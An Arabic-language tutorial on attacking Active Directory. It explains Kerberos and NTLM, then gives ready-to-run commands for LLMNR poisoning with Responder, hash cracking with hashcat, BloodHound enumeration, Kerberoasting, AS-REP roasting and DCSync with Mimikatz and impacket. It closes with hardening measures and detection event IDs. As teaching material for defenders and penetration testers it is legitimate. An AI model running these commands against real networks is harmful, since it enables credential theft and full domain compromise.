📚 النظرية — بنية الـ Active Directory وبروتوكولات المصادقة

الـ Active Directory (AD) هي خدمة دليل (Directory Service) مخصصة لإدارة الشبكات وهويات المستخدمين والصلاحيات في بيئة ويندوز. تعتمد الهجمات على استغلال البروتوكولات الكامنة للشبكة.

🔑 بروتوكول Kerberos بالتفصيل

بروتوكول المصادقة الافتراضي في ويندوز. يعتمد على فكرة التذاكر (Tickets) لتجنب إرسال كلمات المرور في الشبكة:

  • AS-REQ: يرسل المستخدم طلب مصادقة مشفر بهاش كلمة المرور.
  • AS-REP: يرد خادم الـ KDC بـ TGT (Ticket Granting Ticket) مشفر بهاش الـ KRBTGT.
  • TGS-REQ: يقدم المستخدم الـ TGT ويطلب تذكرة خدمة (TGS) لخدمة معينة.
  • TGS-REP: يعود الـ KDC بالـ TGS مشفرة بهاش حساب الخدمة (وهنا تكمن ثغرة Kerberoasting).

🔬 بروتوكول NTLM & NetNTLM

على الرغم من استخدام Kerberos، لا يزال NTLM مستخدماً كبديل توافقي.

  • NTLM Hash: يتم تخزينه محلياً في ذاكرة الـ LSASS أو قاعدة بيانات SAM. يمكن استخدامه مباشرة في هجمات Pass-the-Hash.
  • NetNTLM (Challenge-Response): يتم إرساله عبر الشبكة (مثال عبر بروتوكول SMB). لا يمكن استخدامه مباشرة في Pass-the-Hash ولكن يمكن عمل Brute-force له أو تمريره (Relaying).

🔬 تشريح مسار الاختراق — من الصفر إلى الـ Domain Admin

1️⃣
LLMNR/NBT-NS Poisoning (Responder)

الاستماع لاستعلامات الشبكة الخاطئة وتزييف الهوية للحصول على هاشات NetNTLMv2 الخاصة بالموظفين.

# Launch Responder to capture hashes sudo responder -I eth0 -dwv # Crack captured hashes using Hashcat hashcat -m 5600 hashes.txt wordlist.txt
2️⃣
Active Directory Enumeration (BloodHound)

جمع معلومات الدليل لرسم مسار الهجوم ومعرفة العلاقات والصلاحيات المتاحة للمستخدم المكتشف.

# Collect AD data using SharpHound (executed on domain machine) .\SharpHound.exe -c All --ZipFileName loot.zip # Or remotely using python-based collector bloodhound-python -u 'user' -p 'pass' -d 'corp.local' -dc 'dc.corp.local' -c All
3️⃣
Kerberoasting & AS-REP Roasting

طلب تذاكر KGS لخدمات معينة وسحب الهاشات لمحاولة كسرها أوفلاين.

# AS-REP Roasting (No pre-authentication users) impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt # Kerberoasting (Request Service Tickets) impacket-GetUserSPNs corp.local/user:pass -request -outputfile kerb.txt # Crack with Hashcat hashcat -m 18200 kerb.txt wordlist.txt
4️⃣
DCSync Attack (Domain Compromise)

استغلال صلاحيات المزامنة (GetChangesAll) لمحاكاة سلوك Domain Controller وسحب هاش الـ KRBTGT والمسؤولين مباشرة.

# Execute DCSync using Mimikatz lsadump::dcsync /domain:corp.local /user:Administrator # Or remotely using Impacket impacket-secretsdump -just-dc-user Administrator corp.local/user:pass@192.168.1.10

🛡️ الحماية والدفاع — AD Hardening

✅ تحصين الخوادم وإدارة الهويات

  • Tiered Administration: فصل حسابات مسؤولي النطاق (Domain Admins) عن خوادم الـ Workstations لمنع سرقة بياناتهم من الذاكرة.
  • LAPS: استخدام Local Administrator Password Solution لتعيين كلمات مرور عشوائية ومختلفة للمسؤولين المحليين لكل جهاز.
  • Protected Users Group: إدراج الحسابات الحساسة في هذه المجموعة لمنع استخدام بروتوكولات المصادقة الضعيفة كـ NTLM.

🔒 مراقبة الأحداث (Event IDs)

  • Event ID 4624: مراقبة عمليات تسجيل الدخول الناجحة (Type 3 لـ Network login).
  • Event ID 4769: طلب تذكرة خدمة Kerberos (مفيد لكشف هجمات Kerberoasting عند تكراره بشكل كثيف).
  • Event ID 4662: الوصول لكائنات الدليل (مفيد لكشف هجمات المزامنة DCSync).
